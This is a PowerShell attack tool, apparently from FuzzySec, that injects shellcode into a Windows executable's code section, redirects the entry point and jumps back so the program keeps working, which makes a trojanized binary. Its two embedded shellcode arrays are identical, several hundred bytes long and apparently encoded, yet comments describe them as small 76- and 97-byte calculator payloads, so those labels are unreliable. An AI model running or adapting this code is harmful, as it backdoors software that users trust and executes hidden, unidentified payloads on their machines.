function Subvert-PE {
<#
.SYNOPSIS

    Inject shellcode into a PE image while retaining the PE functionality.

	Author: Ruben Boonen (@FuzzySec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
	
.DESCRIPTION

	Parse a PE image, inject shellcode at the end of the code section and dynamically patch the entry point. After the shellcode executes, program execution is handed back over to the legitimate PE entry point.
	
.PARAMETER Path

    Path to portable executable.
	
.PARAMETER Write

    Inject shellcode and overwrite the PE. If omitted simply display "Entry Point", "Preferred Image Base" and dump the memory at the null-byte location.

.EXAMPLE

    C:\PS> Subvert-PE -Path C:\Path\To\PE.exe
	
.EXAMPLE

    C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write

.LINK

	http://www.fuzzysecurity.com/
#>

	param (
        [Parameter(Mandatory = $True)]
		[string]$Path,
		[parameter(parametersetname="Write")]
		[switch]$Write
	)  

    # Read File bytes
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    
    New-Variable -Option Constant -Name Magic -Value @{
            "010b" =  "PE32"
            "020b" =  "PE32+"
    }
    
    # Function courtesy of @mattifestation
    function Local:ConvertTo-Int{
        Param(
            [Parameter(Position = 1, Mandatory = $True)]
            [Byte[]]
            $array)
        switch ($array.Length){
            # Convert to WORD & DWORD
            2 { Write-Output ( [UInt16] ('0x{0}' -f (($array | % {$_.ToString('X2')}) -join '')) ) }
            4 { Write-Output (  [Int32] ('0x{0}' -f (($array | % {$_.ToString('X2')}) -join '')) ) }
        }
    }
    
    # Offsets for calculations
    $PE = ConvertTo-Int $bytes[63..60]
    $NumOfPESection = ConvertTo-Int $bytes[($PE+7)..($PE+6)]
    $OptSize = ConvertTo-Int $bytes[($PE+21)..($PE+20)]
    $Opt = $PE + 24
    $SecTbl = $Opt + $OptSize
    
    # Entry point offset
    $EntryPointOffset = '{0:X8}' -f (ConvertTo-Int $bytes[($Opt+19)..($Opt+16)])
	# Duplicate for calculating JMP later
	$EntryPointBefore = ConvertTo-Int $bytes[($Opt+19)..($Opt+16)]
	echo "`nLegitimate Entry Point Offset:   0x$EntryPointOffset"
    
    # PE magic number
    $MagicVal = $Magic[('{0:X4}' -f (ConvertTo-Int $bytes[($Opt+1)..($Opt+0)]))]
    # Preferred ImageBase, based on $MagicVal --> PE32 (DWORD), PE32+ (QWORD)
    If($MagicVal -eq "PE32"){
        $ImageBase = '{0:X8}' -f (ConvertTo-Int $bytes[($Opt+31)..($Opt+28)])
		
    }
    ElseIf($MagicVal -eq "PE32+"){
        $QWORD = ( [UInt64] ('0x{0}' -f ((($bytes[($Opt+30)..($Opt+24)]) | % {$_.ToString('X2')}) -join '')) )
        $ImageBase = '{0:X16}' -f $QWORD
    }
    
    # Preferred Image Base
    echo "Preferred PE Image Base:         0x$ImageBase"
    
    # Grab "Virtual Size" and "Virtual Address" for the CODE section.
    $SecVirtualSize = ConvertTo-Int $bytes[($SecTbl+11)..($SecTbl+8)]
    $SecVirtualAddress = ConvertTo-Int $bytes[($SecTbl+15)..($SecTbl+12)]
    
    # Precise start of CODE null-byte section!
    $NullCount = '{0:X8}' -f ($SecVirtualSize + $SecVirtualAddress)
	
	# Offset in PE is different [$SecVirtualSize + $SecVirtualAddress - ($SecVirtualAddress - $SecPTRRawData)]
	$SecPTRRawData = ConvertTo-Int $bytes[($SecTbl+23)..($SecTbl+20)]
	$ShellCodeWrite = ($SecVirtualSize + $SecVirtualAddress - ($SecVirtualAddress - $SecPTRRawData))
	
	# Hexdump of null-byte padding (before)
	echo "`nNull-Byte Padding dump:"
	$output = ""
	foreach ( $count in $bytes[($ShellCodeWrite - 1)..($ShellCodeWrite+504)] ) {
		if (($output.length%32) -eq 0){
			$output += "`n"
		}
		else{
			$output += "{0:X2} " -f $count
		}
	} echo "$output`n"
	
    # If -Write flag is set
	if($Write){
    
        # Set shellcode variable based on PE architecture
        If($MagicVal -eq "PE32"){
            # 32-bit Universal WinExe (+ restore registers) --> calc (by SkyLined)
            # Size: 76 bytes
            $ShellCode = @(0x48,0x31,0xc9,0x48,0x81,0xe9,0xa6,0xff,0xff,0xff,0x48,0x8d,0x5,0xef,0xff,0xff,0xff,0x48,0xbb,0xfc,0x38,0x2,0x91,0x37,0xd0,0x75,0xcd,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xb4,0x9,0xcb,0xd9,0xb6,0x39,0xde,0x32,0x3,0xc7,0x4a,0x1c,0x32,0x3f,0x8a,0x32,0x3,0x70,0xb9,0x15,0xbc,0x3e,0x40,0x15,0xa0,0x50,0xab,0xd9,0x6,0x88,0x52,0x85,0xd1,0xc0,0xfd,0x6e,0xc8,0x32,0x81,0x1,0x46,0x1f,0x7f,0xc8,0x82,0x8,0x23,0xb6,0x88,0x9e,0xba,0x4c,0x84,0x47,0x23,0xb6,0x3f,0x6d,0x5b,0x41,0x13,0xc,0x44,0xc,0xad,0x25,0x7f,0x78,0x33,0x9f,0x94,0x64,0x8f,0x29,0xc8,0xb6,0x89,0x4c,0xf8,0x70,0xc6,0x2a,0x2e,0xe5,0x4,0xb4,0x4f,0xbe,0x47,0xef,0xaa,0xe3,0x4e,0xb4,0x4f,0x9,0xb4,0x5a,0xd9,0xc3,0x10,0xe3,0xeb,0xf9,0x94,0x2a,0x9e,0x54,0x96,0x3,0x9d,0xb9,0xf0,0x9d,0x50,0xee,0x45,0x3b,0xf7,0x47,0xe6,0x4b,0x1d,0xe,0xd5,0x8c,0x39,0xc6,0x23,0xcf,0x1b,0x4b,0xd5,0x8c,0x8e,0x35,0xed,0x74,0xc6,0xe,0x71,0xd6,0xbb,0xb,0xe6,0xfb,0xac,0x93,0x62,0x5e,0x3e,0x71,0x51,0x35,0x16,0x40,0x21,0xfc,0x3d,0x7c,0x74,0x86,0x36,0xce,0x96,0x32,0xbc,0xb9,0xf0,0x80,0x76,0xce,0x96,0x85,0x4f,0x89,0x3f,0xe1,0x43,0xc9,0xb0,0xd3,0x90,0x7c,0xc4,0x37,0xae,0x79,0x44,0x35,0xb,0xcb,0xa,0x8d,0x7d,0xc4,0x92,0x8a,0x76,0x4d,0xc5,0xb5,0x12,0x73,0x5c,0xb,0xb3,0xc9,0xc3,0x8e,0x12,0x73,0xeb,0xf8,0x7d,0x43,0x98,0xa9,0x2b,0x3e,0xfd,0xa3,0x76,0xfd,0x74,0x56,0xa5,0xa1,0x5b,0xbc,0xc1,0x33,0xce,0x85,0xe6,0x32,0xde,0xd3,0x79,0x97,0xbb,0x6e,0x51,0xfc,0x5f,0x16,0xfd,0x91,0x8d,0x6e,0x51,0x4b,0xac,0xc,0xe,0xe0,0xde,0x2a,0xdd,0xb8,0x84,0xd3,0xc9,0x26,0x55,0xd9,0x83,0xfb,0xe8,0x64,0x7,0x9c,0x86,0x4e,0x69,0x54,0xf3,0xa1,0x62,0xb,0x1e,0xf9,0xa7,0xd5,0x36,0x25,0x64,0x3a,0x1e,0xf9,0x10,0x26,0x3f,0x53,0x9,0xa8,0x59,0xdc,0x11,0x5b,0xf3,0x11,0xd3,0xe2,0xa9,0x2b,0xa0,0x62,0x44,0xdf,0x69,0x31,0x2d,0x44,0x13,0xb8,0x82,0x13,0x11,0xfc,0x9a,0x8a,0x92,0x7d,0x6,0x15,0x3d,0xfc,0x9a,0x3d,0x61,0xb,0xdd,0xea,0x56,0x5e,0xb1,0x48,0x59,0xb8,0x32,0xa2,0xe5,0x4b,0x48,0x8d,0x25,0xf,0xfc,0x18,0x36,0x4,0x53,0xe7,0x4e,0xad,0xd7,0xa7,0xc8,0x1d,0x8a,0xa5,0x2a,0x26,0x87,0xf7,0xca,0xaa,0xb7,0xee,0x1c,0xb9,0x5c,0xb5,0x69,0xf7,0xc,0x2f,0x68,0x9c,0x28,0x6b,0x7d,0x99,0xc7,0x67,0x62,0x8d,0x16,0x8,0x4c,0xf9,0x7c,0x87,0xbc,0xff,0x80,0x4c,0x13,0xe8,0x30,0x2f,0x72,0x26,0x9b,0xd6,0x39,0x1b,0xf3,0x64,0x9f,0xfc,0x5c,0x9e,0x61,0xf9,0x68,0xee,0x7,0xb5,0x34,0xfd,0x8,0x73,0x8f,0xee,0x4f,0x7b,0xe6,0x38,0xed,0x39,0x74,0x68,0x4f,0x6a,0xef,0x27,0x34,0xe,0xb8,0x18,0xb6,0x96,0xaa,0xe3,0x34,0x1c,0xe3,0xee,0x16,0x89,0xd6,0x14,0x27,0x73,0xb7,0x2e,0xc5,0xf5,0xcb,0xc6,0x92,0x73,0xbf,0xee,0x4f,0x7d,0x5e,0x83,0x65,0xdc,0xe0,0x3e,0x2f,0xf4,0x8d,0x96,0xbe,0x18,0xe4,0x3a,0x14,0x26,0xc5,0x2c,0xcc,0xa5,0xd3,0x56,0x7c,0xad,0xd7,0xaf,0x36,0x8b,0x89,0x3a,0x1a,0xc5,0x9b,0xb0,0x67,0xff,0x44,0xb0,0xf6,0x3d,0xd6,0xc7,0x41,0xd1,0x7f,0x31,0x1e,0xc5,0xfe,0x47,0x2a,0xf8,0x44,0xb0,0x1e,0xfd,0x87,0x97,0x1,0xa8,0xfb,0x35,0x26,0x47,0xd8,0x18,0xa1,0x7,0x6e,0xf2,0xa6,0xa3,0xd7,0xc7,0x41,0xc9,0x82,0x57,0x60,0x9c,0xe1,0xff,0x6f,0xc9,0x95,0x54,0x7e,0x9f,0xd7,0xaf,0xe8,0xd0,0x8f,0xe5,0xb1,0x78,0x5c,0x87,0x5d,0x92,0xb1,0x35,0x26,0xaf,0xd7,0xd6,0x1d,0x71,0x5d,0xf,0x5e,0xfb,0x80,0xaf,0xd8,0x5d,0xcf,0x4,0xb1,0x78,0x52,0x7,0x35,0xf2,0x44,0x2b,0x46,0xd8,0x3b,0x2f,0x20,0xf8,0xbb,0x65,0x24,0xad,0xbd,0xc3,0x17,0xaf,0xd3,0x67,0x97,0x65,0x88,0x38,0x94,0x7b,0x43,0x65,0x30,0x9b,0x5c,0xf1,0x2b,0xb8,0xd3,0x65,0x5e,0xad,0xd7,0x91,0x2b,0xf8,0xd3,0x3d,0xea,0xfe,0x32,0x38,0x94,0x6b,0xe8,0xf,0x4e,0xfb,0x84,0x90,0x29,0xfa,0x62,0xad,0x11,0x52,0x2,0x44,0xb9,0xf8,0xc6,0x47,0x16,0xc5,0xd7,0x87,0x41,0xf8,0xd1,0x65,0x1e,0xc5,0xdc,0xe8,0x4e,0xc8,0x44,0xb0,0x19,0xc5,0xa2,0xa9,0xc,0x99,0x44,0xb0,0x10,0xf3,0x28,0xcb,0x65,0x11,0xdd,0x9a,0xb1,0x52,0xd6,0x4,0x68,0x3e,0xce,0xa2,0x8d,0x16,0x27,0x72,0xe3,0xae,0xd1,0x65,0x1d,0x52,0x2,0xc7,0x41,0x3,0xe1,0x91,0xed,0x31,0x2a,0x4b,0xdc,0xcd)}
        ElseIf($MagicVal -eq "PE32+"){
            # 64-bit Universal WinExe (+ restore registers) --> calc (by SkyLined)
            # Size: 97 bytes
            $ShellCode = @(0x48,0x31,0xc9,0x48,0x81,0xe9,0xa6,0xff,0xff,0xff,0x48,0x8d,0x5,0xef,0xff,0xff,0xff,0x48,0xbb,0xfc,0x38,0x2,0x91,0x37,0xd0,0x75,0xcd,0x48,0x31,0x58,0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xb4,0x9,0xcb,0xd9,0xb6,0x39,0xde,0x32,0x3,0xc7,0x4a,0x1c,0x32,0x3f,0x8a,0x32,0x3,0x70,0xb9,0x15,0xbc,0x3e,0x40,0x15,0xa0,0x50,0xab,0xd9,0x6,0x88,0x52,0x85,0xd1,0xc0,0xfd,0x6e,0xc8,0x32,0x81,0x1,0x46,0x1f,0x7f,0xc8,0x82,0x8,0x23,0xb6,0x88,0x9e,0xba,0x4c,0x84,0x47,0x23,0xb6,0x3f,0x6d,0x5b,0x41,0x13,0xc,0x44,0xc,0xad,0x25,0x7f,0x78,0x33,0x9f,0x94,0x64,0x8f,0x29,0xc8,0xb6,0x89,0x4c,0xf8,0x70,0xc6,0x2a,0x2e,0xe5,0x4,0xb4,0x4f,0xbe,0x47,0xef,0xaa,0xe3,0x4e,0xb4,0x4f,0x9,0xb4,0x5a,0xd9,0xc3,0x10,0xe3,0xeb,0xf9,0x94,0x2a,0x9e,0x54,0x96,0x3,0x9d,0xb9,0xf0,0x9d,0x50,0xee,0x45,0x3b,0xf7,0x47,0xe6,0x4b,0x1d,0xe,0xd5,0x8c,0x39,0xc6,0x23,0xcf,0x1b,0x4b,0xd5,0x8c,0x8e,0x35,0xed,0x74,0xc6,0xe,0x71,0xd6,0xbb,0xb,0xe6,0xfb,0xac,0x93,0x62,0x5e,0x3e,0x71,0x51,0x35,0x16,0x40,0x21,0xfc,0x3d,0x7c,0x74,0x86,0x36,0xce,0x96,0x32,0xbc,0xb9,0xf0,0x80,0x76,0xce,0x96,0x85,0x4f,0x89,0x3f,0xe1,0x43,0xc9,0xb0,0xd3,0x90,0x7c,0xc4,0x37,0xae,0x79,0x44,0x35,0xb,0xcb,0xa,0x8d,0x7d,0xc4,0x92,0x8a,0x76,0x4d,0xc5,0xb5,0x12,0x73,0x5c,0xb,0xb3,0xc9,0xc3,0x8e,0x12,0x73,0xeb,0xf8,0x7d,0x43,0x98,0xa9,0x2b,0x3e,0xfd,0xa3,0x76,0xfd,0x74,0x56,0xa5,0xa1,0x5b,0xbc,0xc1,0x33,0xce,0x85,0xe6,0x32,0xde,0xd3,0x79,0x97,0xbb,0x6e,0x51,0xfc,0x5f,0x16,0xfd,0x91,0x8d,0x6e,0x51,0x4b,0xac,0xc,0xe,0xe0,0xde,0x2a,0xdd,0xb8,0x84,0xd3,0xc9,0x26,0x55,0xd9,0x83,0xfb,0xe8,0x64,0x7,0x9c,0x86,0x4e,0x69,0x54,0xf3,0xa1,0x62,0xb,0x1e,0xf9,0xa7,0xd5,0x36,0x25,0x64,0x3a,0x1e,0xf9,0x10,0x26,0x3f,0x53,0x9,0xa8,0x59,0xdc,0x11,0x5b,0xf3,0x11,0xd3,0xe2,0xa9,0x2b,0xa0,0x62,0x44,0xdf,0x69,0x31,0x2d,0x44,0x13,0xb8,0x82,0x13,0x11,0xfc,0x9a,0x8a,0x92,0x7d,0x6,0x15,0x3d,0xfc,0x9a,0x3d,0x61,0xb,0xdd,0xea,0x56,0x5e,0xb1,0x48,0x59,0xb8,0x32,0xa2,0xe5,0x4b,0x48,0x8d,0x25,0xf,0xfc,0x18,0x36,0x4,0x53,0xe7,0x4e,0xad,0xd7,0xa7,0xc8,0x1d,0x8a,0xa5,0x2a,0x26,0x87,0xf7,0xca,0xaa,0xb7,0xee,0x1c,0xb9,0x5c,0xb5,0x69,0xf7,0xc,0x2f,0x68,0x9c,0x28,0x6b,0x7d,0x99,0xc7,0x67,0x62,0x8d,0x16,0x8,0x4c,0xf9,0x7c,0x87,0xbc,0xff,0x80,0x4c,0x13,0xe8,0x30,0x2f,0x72,0x26,0x9b,0xd6,0x39,0x1b,0xf3,0x64,0x9f,0xfc,0x5c,0x9e,0x61,0xf9,0x68,0xee,0x7,0xb5,0x34,0xfd,0x8,0x73,0x8f,0xee,0x4f,0x7b,0xe6,0x38,0xed,0x39,0x74,0x68,0x4f,0x6a,0xef,0x27,0x34,0xe,0xb8,0x18,0xb6,0x96,0xaa,0xe3,0x34,0x1c,0xe3,0xee,0x16,0x89,0xd6,0x14,0x27,0x73,0xb7,0x2e,0xc5,0xf5,0xcb,0xc6,0x92,0x73,0xbf,0xee,0x4f,0x7d,0x5e,0x83,0x65,0xdc,0xe0,0x3e,0x2f,0xf4,0x8d,0x96,0xbe,0x18,0xe4,0x3a,0x14,0x26,0xc5,0x2c,0xcc,0xa5,0xd3,0x56,0x7c,0xad,0xd7,0xaf,0x36,0x8b,0x89,0x3a,0x1a,0xc5,0x9b,0xb0,0x67,0xff,0x44,0xb0,0xf6,0x3d,0xd6,0xc7,0x41,0xd1,0x7f,0x31,0x1e,0xc5,0xfe,0x47,0x2a,0xf8,0x44,0xb0,0x1e,0xfd,0x87,0x97,0x1,0xa8,0xfb,0x35,0x26,0x47,0xd8,0x18,0xa1,0x7,0x6e,0xf2,0xa6,0xa3,0xd7,0xc7,0x41,0xc9,0x82,0x57,0x60,0x9c,0xe1,0xff,0x6f,0xc9,0x95,0x54,0x7e,0x9f,0xd7,0xaf,0xe8,0xd0,0x8f,0xe5,0xb1,0x78,0x5c,0x87,0x5d,0x92,0xb1,0x35,0x26,0xaf,0xd7,0xd6,0x1d,0x71,0x5d,0xf,0x5e,0xfb,0x80,0xaf,0xd8,0x5d,0xcf,0x4,0xb1,0x78,0x52,0x7,0x35,0xf2,0x44,0x2b,0x46,0xd8,0x3b,0x2f,0x20,0xf8,0xbb,0x65,0x24,0xad,0xbd,0xc3,0x17,0xaf,0xd3,0x67,0x97,0x65,0x88,0x38,0x94,0x7b,0x43,0x65,0x30,0x9b,0x5c,0xf1,0x2b,0xb8,0xd3,0x65,0x5e,0xad,0xd7,0x91,0x2b,0xf8,0xd3,0x3d,0xea,0xfe,0x32,0x38,0x94,0x6b,0xe8,0xf,0x4e,0xfb,0x84,0x90,0x29,0xfa,0x62,0xad,0x11,0x52,0x2,0x44,0xb9,0xf8,0xc6,0x47,0x16,0xc5,0xd7,0x87,0x41,0xf8,0xd1,0x65,0x1e,0xc5,0xdc,0xe8,0x4e,0xc8,0x44,0xb0,0x19,0xc5,0xa2,0xa9,0xc,0x99,0x44,0xb0,0x10,0xf3,0x28,0xcb,0x65,0x11,0xdd,0x9a,0xb1,0x52,0xd6,0x4,0x68,0x3e,0xce,0xa2,0x8d,0x16,0x27,0x72,0xe3,0xae,0xd1,0x65,0x1d,0x52,0x2,0xc7,0x41,0x3,0xe1,0x91,0xed,0x31,0x2a,0x4b,0xdc,0xcd )}
        
        # Inject all the things!
        for($i=0; $i -lt $ShellCode.Length; $i++){
            $bytes[($ShellCodeWrite + $i)] = $ShellCode[$i]
        }
        
        # Set new Entry Point Offset --> $NullCount
        $bytes[($Opt+19)] = [byte]('0x' + $NullCount.Substring(0,2))
        $bytes[($Opt+18)] = [byte]('0x' + $NullCount.Substring(2,2))
        $bytes[($Opt+17)] = [byte]('0x' + $NullCount.Substring(4,2))
        $bytes[($Opt+16)] = [byte]('0x' + $NullCount.Substring(6,2))
        
        # Modified Entry Point
        $EntryPointOffset = '{0:X8}' -f (ConvertTo-Int $bytes[($Opt+19)..($Opt+16)])
        echo "Modified Entry Point Offset:     0x$EntryPointOffset"
        
        # Calculate & append farJMP
        $Distance = '{0:x}' -f ($EntryPointBefore - (ConvertTo-Int $bytes[($Opt+19)..($Opt+16)]) - $ShellCode.Length - 5)
        echo "Inject Far JMP:                  0xe9$Distance"
        $bytes[($ShellCodeWrite + $ShellCode.Length)] = 0xE9
        $bytes[($ShellCodeWrite + $ShellCode.Length + 1)] = [byte]('0x' + $Distance.Substring(6,2))
        $bytes[($ShellCodeWrite + $ShellCode.Length + 2)] = [byte]('0x' + $Distance.Substring(4,2))
        $bytes[($ShellCodeWrite + $ShellCode.Length + 3)] = [byte]('0x' + $Distance.Substring(2,2))
        $bytes[($ShellCodeWrite + $ShellCode.Length + 4)] = [byte]('0x' + $Distance.Substring(0,2))
        
        # Hexdump of null-byte padding (after)
        echo "`nNull-Byte Padding After:"
        $output = ""
        foreach ( $count in $bytes[($ShellCodeWrite - 1)..($ShellCodeWrite+504)] ) {
            if (($output.length%32) -eq 0){
                $output += "`n"
            }
            else{
                $output += "{0:X2} " -f $count
            }
        } echo "$output`n"
    
        [System.IO.File]::WriteAllBytes($Path, $bytes)
    }
}